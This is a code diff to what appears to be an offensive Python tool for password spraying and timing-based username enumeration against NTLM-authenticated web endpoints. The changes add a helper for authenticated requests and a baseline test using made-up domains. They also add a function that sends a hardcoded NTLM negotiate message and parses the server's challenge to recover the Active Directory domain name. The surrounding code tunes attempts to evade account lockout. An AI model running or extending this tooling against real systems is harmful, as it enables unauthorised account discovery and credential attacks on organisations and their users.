@@ -8,6 +8,8 @@ import argparse
 from time import sleep, time
 from datetime import datetime
 import urllib3
+import base64
+import re
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 from multiprocessing import Pool
@@ -49,29 +51,39 @@ def check_creds(opts):
     except Exception as e:
         print(f"Error occurred with {username}:{password}: {e}")
 
+def do_request(domain, username, password, proxies, url):
+    auth_false_domain = (f"{domain}\\{username}", password)
+    res = requests.get(url, verify=False, proxies=proxies, auth=auth_false_domain, allow_redirects=False)
+    print("[+] auth creds: %s\\%s, time elapsed: " % (domain, username) + str(res.elapsed))
+    return res.elapsed
 
 def get_avg_time(opts, passwords):
 
     url, domain, authtype, proxies, track_time = opts
 
+    if domain == "":
+        domain = get_domain_name(url)
+
     username1 = "aaaaaaz"
     username2 = "bbbbbbz"
     username3 = "ccccccz"
-    auth = (f"{domain}\\{username1}", passwords[0])
-    auth2 = (f"{domain}\\{username2}", passwords[0])
-    auth3 = (f"{domain}\\{username3}", passwords[0])
-    res = requests.get(url, verify=False, proxies=proxies, auth=auth, allow_redirects=False)
-    time_one = res.elapsed
-    print("[+] auth creds: %s\\%s, time elapsed: " % (domain,username1) + str(res.elapsed))
-    res = requests.get(url, verify=False, proxies=proxies, auth=auth2, allow_redirects=False)
-    time_two = res.elapsed
-    print("[+] auth creds: %s\\%s, time elapsed: " % (domain,username2) + str(res.elapsed))
-    res = requests.get(url, verify=False, proxies=proxies, auth=auth3, allow_redirects=False)
-    time_three = res.elapsed
-    print("[+] auth creds: %s\\%s, time elapsed: " % (domain,username3) + str(res.elapsed))
+    domain_test = "random"
+    domain_test2 = "anything1"
+    domain_test3 = "bread_man"
+
+    print("[*] Performing incorrect Domain Test")
+    do_request(domain_test, username1, passwords[0], proxies, url)
+    do_request(domain_test2, username2, passwords[0], proxies, url)
+    do_request(domain_test3, username3, passwords[0], proxies, url)
+
+    print("[*] Performing incorrect Username Test")
+    time_one = do_request(domain, username1, passwords[0], proxies, url)
+    time_two = do_request(domain, username2, passwords[0], proxies, url)
+    time_three = do_request(domain, username3, passwords[0], proxies, url)
+
 
     avg_time = (time_one + time_two + time_three) / 3
-    return avg_time
+    return avg_time, domain
 
 def check_username(opts):
     url, domain, username, password, authtype, proxies, track_time, thresh = opts
@@ -85,6 +97,24 @@ def check_username(opts):
         #print("[-] INVALID USER: %s\\%s, time elapsed: " % (domain, username) + str(res.elapsed), flush=True)
         return
 
+def get_domain_name(url):
+    reg = "^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.){2,}([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9]){2,}$"
+
+    headers={"Authorization" : "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="}
+    res = requests.get(url=url, headers=headers)
+    ntlm = res.headers['WWW-Authenticate'].split()
+    b64_str = base64.b64decode(ntlm[1])[7:]
+    ntlm_string = re.sub('[^\x21-\x39\x41-\x5A\x61-\x7A\x5F]+',',',str(b64_str))
+    ntlm_string_split = ntlm_string.split('x00.')
+    tld = ntlm_string_split[3].split(',')[:4]
+    tld_str = ""
+    for i in tld:
+        tld_str += i.replace("x00","").replace(",","")
+    domain = ntlm_string_split[2].replace("x00","").replace(",","") + "." + tld_str
+
+    print("[+] Domain Found: %s" % (domain))
+    return domain
+
 
 if __name__ == "__main__":
 
@@ -92,7 +122,7 @@ if __name__ == "__main__":
 
     args.add_argument('-u', '--usernames', help="List of usernames to attack", required=True)
     args.add_argument('-p', '--passwords', help="List of passwords to try", required=True)
-    args.add_argument('-d', '--domain', help="Domain name to append. If not included, then domains will be assumed to be in username list.", required=False)
+    args.add_argument('-d', '--domain', help="Domain name to append. If not included, then domains will be assumed to be in username list.", required=False, default="")
     args.add_argument('-U', '--url', help="URL to authenticate against", required=True)
     args.add_argument('-a', '--attempts', 
                         help="Number of attempts to try before sleeping. If your lockout policy is 5 attempts per 10 minutes, then set this to like 3", 
@@ -149,7 +179,7 @@ if __name__ == "__main__":
             current += 1
     elif(opts.validate_users):
         attempts = (opts.url, opts.domain, opts.authtype, proxies, opts.add_response)
-        avg_time = get_avg_time(attempts, passwords)
+        avg_time, domain = get_avg_time(attempts, passwords)
         print("[+] Avg time: " + str(avg_time))
         thresh = avg_time * 0.6
         print("[*] Threshold: " + str(thresh))
